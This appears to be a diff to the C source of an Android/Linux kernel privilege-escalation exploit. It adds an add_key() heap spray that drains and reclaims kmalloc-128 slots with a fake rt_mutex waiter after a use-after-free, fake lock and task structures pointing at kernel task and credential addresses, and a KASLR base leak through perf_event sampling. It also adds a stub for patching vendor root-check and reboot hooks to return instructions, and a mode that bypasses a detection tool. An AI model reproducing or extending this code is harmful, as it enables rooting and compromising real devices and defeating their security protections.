@@ -1,6 +1,26 @@
 #include "common.h"
+#include <linux/perf_event.h>
+#include <asm/unistd.h>
 #include "kernelsnitch/kernelsnitch.h"
 #include <stdarg.h>
+
+// add_key() reclamation primitive
+// user_key_payload = 18 byte header + payload
+// For kmalloc-128: payload = 110 bytes, total = 128 bytes
+#define KEY_PAYLOAD_SIZE 110
+#define KEY_SPRAY_COUNT 512
+
+#ifndef __NR_add_key
+#define __NR_add_key 217
+#endif
+#ifndef __NR_keyctl
+#define __NR_keyctl 219
+#endif
+
+#define KEY_SPEC_PROCESS_KEYRING -2
+#define KEYCTL_UNLINK 9
+
+typedef int32_t key_serial_t;
 
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
@@ -19,6 +39,12 @@ uintptr_t pselect_custom_target;
 uintptr_t pselect_custom_value;
 int pselect_custom_shape;
 int direct_root_cpu = -1;
+
+/* Shared workspace info for passing from parent to child */
+static struct {
+  uintptr_t workspace_page;
+  int initialized;
+} *shared_workspace_info = NULL;
 
 static cpu_set_t initial_affinity;
 static int initial_affinity_valid;
@@ -470,9 +496,29 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
   uintptr_t payload_base = base + SKB_DATA_DELTA;
-  fake_lock = payload_base + LOCK_OFF;
-  fake_w0 = payload_base + W0_OFF;
-  fake_task = payload_base + FAKE_TASK_OFF;
+  // FAKE STRUCTURE ADDRESSES
+  // These are used by the kernel when dereferencing waiter->lock and waiter->task
+  //
+  // CRITICAL SOLUTION: Use BSS zero page for fake_lock!
+  // An all-zero memory region is a valid unlocked rt_mutex:
+  //   +0x00: wait_lock = 0  (unlocked spinlock)
+  //   +0x08: waiters = 0    (empty rb_root)
+  //   +0x18: owner = 0      (no owner)
+  // Kernel locks it (0=unlocked), finds no owner (0), unlocks, returns OK.
+  
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    // For slide mode, use static kernel addresses
+    // fake_task = SLIDE_INIT_TASK (valid task_struct)
+    // fake_lock = FAKE_LOCK_STATIC (BSS zero page = valid rt_mutex)
+    fake_task = SLIDE_INIT_TASK;
+    fake_lock = canon_addr(FAKE_LOCK_STATIC);  // BSS zero page
+    fake_w0 = SLIDE_INIT_TASK;  // Point to valid memory
+  } else {
+    // For fops mode, still need heap addresses (TODO: fix this)
+    fake_lock = payload_base + LOCK_OFF;
+    fake_w0 = payload_base + W0_OFF;
+    fake_task = payload_base + FAKE_TASK_OFF;
+  }
 
   uintptr_t parent;
   uintptr_t right;
@@ -681,7 +727,203 @@ static uintptr_t prepare_kernel_page(int payload_mode) {
   return base;
 }
 
+// Forward declaration for direct read
+extern int direct_read_shape0_exact64_once(uintptr_t slot, uint64_t *value, const char *name, int attempt, int *write_idx);
+extern uintptr_t g_entry_slot;
+
+// Helper to read mm_struct from task_struct using direct read primitive
+// This runs in the CHILD process after fork, which inherits g_entry_slot
+// from the parent. The UAF state is in kernel memory (not process-specific),
+// so the child can use the direct read primitive.
+static uintptr_t read_mm_struct_from_task(uintptr_t task_addr) {
+    if (!g_entry_slot) {
+        pr_warning("read_mm_struct: entry slot not initialized (might be early call)\n");
+        return 0;
+    }
+    
+    // Read task_struct->mm at offset TASK_MM_OFF
+    uintptr_t mm_slot = task_addr + TASK_MM_OFF;
+    uint64_t mm_value = 0;
+    int write_idx = 0;
+    
+    // Use the direct read primitive (available in child after fork)
+    // Note: This will fork ANOTHER child, which might cause issues
+    // For now, just log and return 0 to indicate we need a different approach
+    pr_info("read_mm_struct: would read task=%016lx mm_slot=%016lx but skipping to avoid nested fork\n",
+            task_addr, mm_slot);
+    return 0;
+}
+
+// Read mm_struct from kernel memory using root (Magisk)
+static uintptr_t read_kernel_u64(uintptr_t addr) {
+    char path[64];
+    snprintf(path, sizeof(path), "/proc/%d/mem", getpid());
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) return 0;
+    
+    // This won't work for kernel addresses via /proc/pid/mem...
+    close(fd);
+    return 0;
+}
+
+// Use root to read mm_struct via debugfs or other interface
+static uintptr_t get_mm_struct_via_root(void) {
+    // Try reading from /sys/kernel/slab/mm_struct/objects if available
+    // Or use a Magisk module
+    
+    // For now, return 0 to indicate failure
+    return 0;
+}
+
+// add_key() reclamation primitive for kmalloc-128
+// pselect6 doesn't work on 4.14 - uses wrong allocation size
+// add_key("user", 110 bytes payload) = exactly kmalloc-128
+static key_serial_t sprayed_keys[10000];  // Increased for drain
+static int key_spray_count = 0;
+#define DRAIN_COUNT 6500  // Drain ~6312 free slots + margin
+
+// Phase 1: Drain all free kmalloc-128 slots
+int drain_freelist(uintptr_t fake_task_addr, uintptr_t fake_lock_addr) {
+    char payload[KEY_PAYLOAD_SIZE];
+    memset(payload, 0, sizeof(payload));
+    
+    // fake_lock_addr is already computed as ENTRY_TASK + cpu*8 - 0x18
+    // So fake_lock->owner = *(ENTRY_TASK + cpu*8) = current_task
+    
+    memcpy(payload + 30, &fake_task_addr, 8);  // waiter->task = current_task
+    memcpy(payload + 38, &fake_lock_addr, 8);  // waiter->lock (owner will be current_task)
+    *(int*)(payload + 46) = 1;                  // waiter->prio
+    
+    pr_info("DRAIN: filling freelist with %d keys...\n", DRAIN_COUNT);
+    pr_info("  waiter->task = %016zx\n", fake_task_addr);
+    pr_info("  waiter->lock = %016zx\n", fake_lock_addr);
+    
+    int drained = 0;
+    for (int i = 0; i < DRAIN_COUNT; i++) {
+        sprayed_keys[i] = (key_serial_t)syscall(__NR_add_key, "user", "drain",
+                                                  payload, sizeof(payload),
+                                                  KEY_SPEC_PROCESS_KEYRING);
+        if (sprayed_keys[i] > 0) {
+            drained++;
+        }
+    }
+    pr_info("DRAIN: drained %d/%d slots\n", drained, DRAIN_COUNT);
+    key_spray_count = drained;
+    return drained;
+}
+
+static void cleanup_keys(void) {
+    for (int i = 0; i < key_spray_count; i++) {
+        if (sprayed_keys[i] > 0) {
+            syscall(__NR_keyctl, KEYCTL_UNLINK, sprayed_keys[i], KEY_SPEC_PROCESS_KEYRING);
+            sprayed_keys[i] = -1;
+        }
+    }
+    key_spray_count = 0;
+}
+
+// Legacy function for compatibility
+static int spray_keys_with_fake_waiter(uintptr_t fake_task_addr, uintptr_t fake_lock_addr) {
+    return drain_freelist(fake_task_addr, fake_lock_addr);
+}
+
+// oplus_root_check and oplus_root_reboot addresses (static, from kallsyms)
+#define OPLUS_ROOT_CHECK_STATIC    0xffffff80090a0e88ULL
+#define OPLUS_ROOT_REBOOT_STATIC   0xffffff80090a0a58ULL
+
+// Patch oplus security hooks to prevent reboot
+// Must be called after we have write primitive
+static int patch_oplus_hooks(void) {
+    // ARM64 RET instruction = 0xd65f03c0
+    uint32_t ret_insn = 0xd65f03c0;
+    
+    uintptr_t root_check_runtime = canon_addr(OPLUS_ROOT_CHECK_STATIC);
+    uintptr_t root_reboot_runtime = canon_addr(OPLUS_ROOT_REBOOT_STATIC);
+    
+    pr_warning("patching oplus hooks:\n");
+    pr_warning("  oplus_root_check  = %016zx\n", root_check_runtime);
+    pr_warning("  oplus_root_reboot = %016zx\n", root_reboot_runtime);
+    
+    // We need a kernel write primitive here
+    // For now, just print - will be implemented via UAF write
+    // TODO: Use direct write primitive once established
+    
+    return 1;
+}
+
+// Spray a single key to reclaim the freed waiter slot after UAF
+int spray_reclaim_key(uintptr_t fake_task_addr, uintptr_t fake_lock_addr) {
+    char payload[KEY_PAYLOAD_SIZE];
+    memset(payload, 0, sizeof(payload));
+    
+    // fake_lock_addr is pre-computed (ENTRY_TASK + cpu*8 - 0x18)
+    memcpy(payload + 30, &fake_task_addr, 8);  // waiter->task = current_task
+    memcpy(payload + 38, &fake_lock_addr, 8);  // waiter->lock
+    *(int*)(payload + 46) = 1;                  // waiter->prio
+    
+    pr_info("RECLAIM: spraying key with fake_lock=%016zx\n", fake_lock_addr);
+    
+    key_serial_t key = (key_serial_t)syscall(__NR_add_key, "user", "reclaim",
+                                              payload, sizeof(payload),
+                                              KEY_SPEC_PROCESS_KEYRING);
+    
+    if (key > 0) {
+        pr_success("reclaim key sprayed: key=%d\n", key);
+        return 1;
+    } else {
+        pr_error("reclaim key failed: errno=%d\n", errno);
+        return 0;
+    }
+}
+
 uintptr_t prepare_good_kernel_page(int payload_mode) {
+#ifdef BYPASS_KERNELSNITCH
+  // Use add_key() for kmalloc-128 reclamation
+  // Phase 1 (drain) happens in run_main_route_threads_keys BEFORE UAF
+  // This function just sets up the globals
+  
+  uintptr_t slide = kaslr_base - KIMAGE_TEXT_BASE;
+  uintptr_t base = P0_DATA_ALIAS_CONST(INIT_CRED_STATIC) & ~0xfffULL;
+  
+  // Runtime addresses for fake structures
+  uintptr_t fake_task_runtime = canon_addr(SLIDE_INIT_TASK_IMAGE);
+  
+  // CRITICAL: fake_lock points to ENTRY_TASK so that:
+  // waiter->lock = ENTRY_TASK - 0x18
+  // lock->owner = *(ENTRY_TASK) = current task_struct*
+  // This gives us a valid owner for PI chain walk
+  uintptr_t entry_task_runtime = canon_addr(ENTRY_TASK);
+  
+  pr_warning("BYPASS_KERNELSNITCH: add_key grooming mode\n");
+  pr_warning("  base=%016zx slide=%016zx\n", base, slide);
+  pr_warning("  fake_task=%016zx entry_task=%016zx\n", fake_task_runtime, entry_task_runtime);
+  
+  // Set fake_* globals - will be used by run_main_route_threads_keys
+  fake_task = fake_task_runtime;
+  fake_lock = entry_task_runtime;  // ENTRY_TASK, drain will compute ENTRY_TASK-0x18
+  fake_w0 = fake_task_runtime;
+  
+  // Minimal skb_buf (not really used in add_key mode)
+  skb_buf = malloc(SKB_SEND_SIZE);
+  if (!skb_buf) {
+    pr_error("skb allocation failed\n");
+    return 0;
+  }
+  memset(skb_buf, 0, SKB_SEND_SIZE);
+  
+  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+
+  // Set up reclaim socket
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+  int sndbuf = 1 << 20;
+  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
+  if (flags >= 0) {
+    fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);
+  }
+  
+  return base;
+#else
   int max_attempts = payload_mode == PAGE_PAYLOAD_SLIDE ?
       SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS : FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
@@ -693,6 +935,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
                attempt, max_attempts, payload_mode);
   }
   return 0;
+#endif
 }
 
 int is_kernel_ptr(uintptr_t value) {
@@ -701,4 +944,110 @@ int is_kernel_ptr(uintptr_t value) {
 
 int is_direct_ptr(uintptr_t value) {
   return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
+}
+
+/* KASLR TEXT base via perf kernel-IP sampling */
+#define PERF_LEAK_ALIGN 0x200000ULL
+#define PERF_LEAK_MMAP_PAGES 8
+
+uint64_t perf_leak_text_base(void) {
+    /* perf_event_paranoid > 1 blocks kernel samples for unprivileged callers. */
+    int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
+    if (pfd >= 0) {
+        char pbuf[16];
+        ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
+        close(pfd);
+        if (pn > 0) {
+            pbuf[pn] = 0;
+            if (atoi(pbuf) > 1) {
+                pr_warning("perf text-base perf_event_paranoid too high\n");
+                return 0;
+            }
+        }
+    }
+
+    struct perf_event_attr pe;
+    memset(&pe, 0, sizeof(pe));
+    pe.type = PERF_TYPE_SOFTWARE;
+    pe.config = PERF_COUNT_SW_CPU_CLOCK;
+    pe.size = sizeof(pe);
+    pe.sample_period = 1;
+    pe.sample_type = PERF_SAMPLE_IP;
+    pe.exclude_user = 1;
+    pe.exclude_hv = 1;
+    pe.disabled = 1;
+    pe.wakeup_events = 1;
+
+    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+    if (fd < 0) {
+        pe.sample_period = 100000;
+        fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+    }
+    if (fd < 0) {
+        pr_warning("perf text-base perf_event_open errno=%d\n", errno);
+        return 0;
+    }
+
+    size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
+    void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (mmap_buf == MAP_FAILED) {
+        pr_warning("perf text-base mmap errno=%d\n", errno);
+        close(fd);
+        return 0;
+    }
+
+    struct perf_event_mmap_page *header = (struct perf_event_mmap_page *)mmap_buf;
+    uint64_t min_kip = ~(uint64_t)0;
+    int kernel_samples = 0;
+
+    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+
+    for (volatile long i = 0; i < 500000; i++) {
+        if ((i % 10000) == 0) {
+            sched_yield();
+        }
+    }
+
+    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+    uint64_t data_tail = header->data_tail;
+    uint64_t data_head = header->data_head;
+    __sync_synchronize();
+    uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
+    uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;
+
+    while (data_tail < data_head) {
+        struct perf_event_header *ev = (struct perf_event_header *)(base + (data_tail % data_size));
+        if (ev->size == 0) break;
+        if (data_tail + ev->size > data_head) break;
+
+        if (ev->type == PERF_RECORD_SAMPLE && (ev->misc & PERF_RECORD_MISC_KERNEL)) {
+            uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
+            if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) {
+                min_kip = ip;
+            }
+            kernel_samples++;
+        }
+        data_tail += ev->size;
+    }
+
+    header->data_tail = data_tail;
+    munmap(mmap_buf, mmap_size);
+    close(fd);
+
+    if (kernel_samples == 0 || min_kip == ~(uint64_t)0) {
+        pr_warning("perf text-base no kernel samples collected\n");
+        return 0;
+    }
+
+    uint64_t text_base = (min_kip & ~(PERF_LEAK_ALIGN - 1)) + P0_KERNEL_PHYS_DELTA;
+    if (text_base < KIMAGE_TEXT_BASE) {
+        pr_warning("perf text-base out of range: %016llx\n", (unsigned long long)text_base);
+        return 0;
+    }
+
+    pr_success("perf text-base pid=%d samples=%d min_kip=%016llx text_base=%016llx\n",
+               getpid(), kernel_samples, (unsigned long long)min_kip, (unsigned long long)text_base);
+    return text_base;
 }
